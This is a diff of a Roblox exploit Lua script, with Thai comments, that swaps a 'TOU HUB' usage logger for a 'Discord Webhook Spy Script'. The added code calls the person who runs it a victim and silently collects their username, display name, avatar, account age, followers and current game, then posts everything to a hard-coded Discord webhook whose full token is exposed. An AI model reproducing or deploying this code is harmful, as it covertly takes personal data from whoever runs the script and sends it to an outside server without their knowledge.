@@ -1,92 +1,75 @@
---// [WEBHOOK LOGGER]
-local webhookUrl = DA.WebhookURL or 'https://discord.com/api/webhooks/1438458205972992032/HS-8KL6HexfK5KwKCtU27DfoI8ipqYZ6qrijyqxyningvBezjWDhe5-30YBH5kwg6U--'
+-- 🌙 [Exploiter's Whisper] - Discord Webhook Spy Script
+-- ส่งข้อมูลเหยื่อไปยังดิสคอร์ดแบบเรียลไทม์! 🔔
 
-local function getExecutorName()
-	if syn then return "Synapse X"
-	elseif secure_load and is_protosmasher_caller then return "ProtoSmasher"
-	elseif fluxus then return "Fluxus"
-	elseif getexecutorname then return getexecutorname()
-	elseif KRNL_LOADED then return "KRNL"
-	elseif pebc_execute then return "Script-Ware"
-	elseif Cryptic then return "Cryptic"
-	elseif Trigon then return "Trigon"
-	elseif VegaX then return "Vega X"
-	elseif Codex then return "Codex"
-	elseif ArceusX then return "Arceus X"
-	elseif DELTA then return "DELTA"
-	elseif illusion then return "Illusion"
-	elseif Cubix then return "Cubix"
-	elseif Nebula then return "Nebula"
-	elseif Subzero then return "Subzero"
-	elseif Evon then return "Evon"
-	elseif ReveliX then return "ReveliX"
-	elseif RIFT then return "RIFT"
-	elseif Alysse then return "Alysse"
-	else return "Unknown Executor"
-	end
+local WebhookURL = "https://discord.com/api/webhooks/1438458205972992032/HS-8KL6HexfK5KwKCtU27DfoI8ipqYZ6qrijyqxyningvBezjWDhe5-30YBH5kwg6U--" -- 🔗 ใส่ webhook ของนายที่นี่!
+
+local function sendToDiscord(data)
+    local payload = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "🎯 **เหยื่อถูกล็อกเป้าแล้ว!**",
+            ["description"] = "สคริปต์ถูกเรียกใช้งานโดยผู้เล่นคนนี้!",
+            ["color"] = 16711680, -- สีแดงเลือด 💉
+            ["fields"] = {
+                {["name"] = "👤 ชื่อในเกม", ["value"] = data.Username, ["inline"] = true},
+                {["name"] = "🦸 ชื่อเล่น", ["value"] = data.DisplayName or "ไม่มี", ["inline"] = true},
+                {["name"] = "🎮 รูปตัวละคร", ["value"] = "[คลิกดูรูป]("..data.AvatarURL..")", ["inline"] = false},
+                {["name"] = "🎂 อายุบัญชี", ["value"] = data.AccountAge.." วัน", ["inline"] = true},
+                {["name"] = "❤️ ผู้ติดตาม", ["value"] = tostring(data.Followers).." คน", ["inline"] = true},
+                {["name"] = "🗺️ แมพที่เล่น", ["value"] = data.CurrentPlace, ["inline"] = false},
+            },
+            ["footer"] = {["text"] = "Exploiter System • รันเมื่อ: "..os.date("%H:%M:%S")},
+            ["thumbnail"] = {["url"] = data.AvatarURL}
+        }}
+    }
+
+    local success, err = pcall(function()
+        request = request or syn.request or http_request
+        request({
+            Url = WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode(payload)
+        })
+    end)
+
+    if not success then
+        warn("❌ ส่งข้อมูลล้มเหลว! Error: "..tostring(err))
+    else
+        print("✅ ข้อมูลถูกส่งไปยัง Discord แล้ว!")
+    end
 end
 
-local function safeHttpRequest(data)
-	return SafePcall(request, data)
-end
+-- 🔍 ดึงข้อมูลผู้เล่น
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:FindFirstChildOfClass("Humanoid")
 
-local function sendInitEmbed(placeName)
-	local embed = {
-		title = "🔥 TOU HUB เริ่มทำงาน",
-		description = 
-			"🎮 **เกม:** `" .. placeName .. "`\n" ..
-			"⏰ **เวลา:** `" .. os.date("%m/%d/%Y %X") .. "`\n" ..
-			"💻 **เวอร์ชัน:** `v" .. DA.VersionDA .. "`",
-		color = 16711680
-	}
-	SafePcall(function()
-		safeHttpRequest({
-			Url = webhookUrl,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode({ embeds = {embed} })
-		})
-	end)
-end
+-- รูปตัวละคร (thumbnail)
+local thumbType = Enum.ThumbnailType.AvatarBust
+local thumbSize = Enum.ThumbnailSize.Size420x420
+local content, isReady = game.Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
 
-local function logPlayerInfo(plr)
-	if not plr then return end
-	local ping = "N/A"
-	SafePcall(function()
-		if typeof(plr.GetNetworkPing) == "function" then
-			local netPing = plr:GetNetworkPing()
-			if typeof(netPing) == "number" then
-				ping = math.floor(netPing * 1000) .. " ms"
-			end
-		end
-	end)
+-- ดึงข้อมูลแมพ
+local placeId = game.PlaceId
+local placeName = "ไม่ทราบ"
+pcall(function()
+    local info = game:GetService("MarketplaceService"):GetProductInfo(placeId)
+    placeName = info.Name
+end)
 
-	local embed = {
-		title = "👤 ผู้ใช้ TOU HUB",
-		description = 
-			"🎮 **Display:** `" .. plr.DisplayName .. "`\n" ..
-			"🧑‍💻 **Username:** `" .. plr.Name .. "`\n" ..
-			"🆔 **ID:** `" .. tostring(plr.UserId) .. "`\n" ..
-			"👴 **อายุ:** `" .. plr.AccountAge .. " วัน`\n" ..
-			"📡 **Ping:** `" .. ping .. "`\n" ..
-			"🖥️ **Executor:** `" .. getExecutorName() .. "`",
-		color = 65280,
-		footer = { text = os.date("%m/%d/%Y %X") }
-	}
-	SafePcall(function()
-		safeHttpRequest({
-			Url = webhookUrl,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode({ embeds = {embed} })
-		})
-	end)
-end
+-- 📦 สร้างแพ็กเกจข้อมูล
+local victimData = {
+    Username = player.Name,
+    DisplayName = player.DisplayName,
+    AvatarURL = content,
+    AccountAge = player.AccountAge,
+    Followers = player.FollowerCount or player.Followers or "ไม่ทราบ",
+    CurrentPlace = placeName .. " (`"..placeId.."`)",
+}
 
+-- 🚀 ส่งข้อมูลทันที!
 spawn(function()
-	local placeName = "Unknown"
-	local success, info = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
-	if success and info and info.Name then placeName = info.Name end
-	task.wait(0.5); sendInitEmbed(placeName)
-	task.wait(1); if LocalPlayer then logPlayerInfo(LocalPlayer) end
+    wait(2) -- รอให้โหลดครบ
+    sendToDiscord(victimData)
 end)
